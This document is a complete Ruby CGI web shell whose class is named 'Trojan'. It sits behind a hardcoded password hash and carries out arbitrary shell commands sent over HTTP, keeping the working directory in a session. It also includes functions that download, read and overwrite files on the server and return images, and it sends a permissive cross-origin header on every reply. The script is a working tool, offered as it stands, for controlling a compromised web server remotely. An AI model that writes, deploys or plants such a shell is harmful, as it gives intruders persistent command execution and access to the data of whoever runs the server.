#!/usr/bin/env ruby
require 'cgi'
require 'cgi/session'
require 'cgi/session/pstore'
require 'digest/sha1'
require 'fileutils'
require 'json'

class Trojan
    attr_accessor :cgi, :cwd, :response, :session

    def initialize params
        @cgi      = params[:cgi]
        @session  = params[:session]
        @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]
        @response = {};
    end

    def process_command()
        json = @cgi.params
        if json['action'].first.eql? 'shell'
            process_shell_command(json['cmd'].first)
        else
            send json['action'].first, json
        end
    end

    def process_shell_command command
        out_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
        @cwd                = @session[:cwd] = out_lines.pop
        @response['output'] = out_lines.join "\n"
        self.send_response
    end

    def send_response
        @response['prompt_context'] = self.get_prompt_context
        puts @cgi.header('Access-Control-Allow-Origin: *')
        puts @response.to_json
        exit
    end

    def get_prompt_context
        whoami          =  `whoami`.strip!
        hostname        =  `hostname`.strip!
        line_terminator =  (whoami == 'root') ? '#' : '$';
        return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
    end

    def method_missing method, *args
        @response['error'] = "#{method} unsupported"
        self.send_response
    end

    ##########################################################################
    # Payload functions are from here downward
    ##########################################################################
    def payload_file_down json
        Dir.chdir @cwd
        dl_file = json['args[file]'].first

        if File.exist? dl_file
            puts @cgi.header(
                'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
                'Content-Transfer-Encoding' => 'binary',
            );
            puts File.read(dl_file)
        else
            puts "File does not exist"
        end
    end

    def payload_file_read json
        Dir.chdir @cwd
        dl_file = json['args[file]'].first

        unless File.readable? dl_file
            @response['error'] = 'File is not readable or does not exist.'
        else
            @response['output'] = {
                'output' => File.read(dl_file),
                'file'   => File.realpath(dl_file),
            }
        end

        self.send_response
    end

    def payload_file_write json
        Dir.chdir @cwd
        write_file = json['args[file]'].first

        if File.writable? write_file
            File.open(write_file, 'w') {|f| f.write(json['args[data]'].first) }
            @response['output'] = 'Write successful'
        else
            @response['error'] = 'Failed. File may not be writable, or may not exist.'
        end
        self.send_response
    end

    def payload_image_view json
        Dir.chdir @cwd
        img_file = json['args[file]'].first

        if File.readable? img_file
            mime_type = `file --mime-type -b #{img_file}`.strip!
            puts @cgi.header("Content-Type: #{mime_type}")
            puts File.read(img_file)
        else
            puts 'File does not exist.'
        end
        exit
    end
end

# ---------- Procedural code starts here ----------

cgi  = CGI.new

hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + '6cbdb4798a')
if hash.eql? '62be3607c4a9e56be305e8b939580f85c4c1792d'
    session = CGI::Session.new(
        cgi,
        'database_manager' => CGI::Session::PStore,
        'session_key'      => 'wash',
        'session_expires'  => Time.now + 30 * 60,
        'prefix'           => 'wash_pstore_sid_'
    )
    trojan = Trojan.new({
        :cgi     => cgi, 
        :session => session, 
    })
    trojan.process_command
    session.close
else
    puts cgi.header('Access-Control-Allow-Origin: *')
    puts '{"error":"Invalid password."}'
end
